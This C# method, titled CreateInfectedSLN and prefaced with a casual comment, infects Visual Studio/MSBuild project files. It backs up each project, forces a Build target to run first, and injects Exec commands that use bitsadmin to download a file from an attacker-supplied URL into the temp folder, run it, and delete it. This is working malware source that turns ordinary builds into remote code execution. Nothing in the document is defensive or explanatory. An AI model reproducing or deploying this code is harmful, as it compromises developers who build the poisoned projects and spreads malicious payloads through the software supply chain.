//this code is trash and should be improved alot have fun. 

  private void CreateInfectedSLN(string Path, string Job, string rURL, string fName)
        {
            string vec0 = "<Project ToolsVersion=\"15.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">"; 
            string pCall = "<Project ToolsVersion=\"14.0\" InitialTargets=\"Build\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">";
            string vec1 = "<Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\" />";
            string payload = "<Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\"/>^<Target Name=\"Build\">-<Exec Command=\"bitsadmin.exe /transfer " + Job + " " + rURL + " %temp%\\" + fName + "\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Exec Command=\"%temp%\\" + fName + "\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Exec Command=\"del %temp%\\" + fName + "\" >+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Message Importance=\"high\" Text=\"$(ErrorCode)\"/>-</Target> ";
            string STR = File.ReadAllText(Path);

            if (File.Exists(Path + ".bk"))
            {

                File.Delete(Path);
                File.Copy(Path + ".bk", Path);
                File.Delete(Path + ".bk");
                File.Copy(Path, Path + ".bk");

                payload = payload.Replace("^", "\n  ");
                payload = payload.Replace("-", "\n    ");
                payload = payload.Replace("+", "\n      ");
                STR = STR.Replace(vec0, pCall);
                STR = STR.Replace(vec1, payload);
                File.WriteAllText(Path, STR);
               
                STR = "";
            }
            else
            {

                File.Copy(Path, Path + ".bk");
                payload = payload.Replace("^", "\n  ");
                payload = payload.Replace("-", "\n    ");
                payload = payload.Replace("+", "\n      ");
                STR = STR.Replace(vec0, pCall);
                STR = STR.Replace(vec1, payload);
                File.WriteAllText(Path, STR);
               
                STR = "";
            }
        }
   
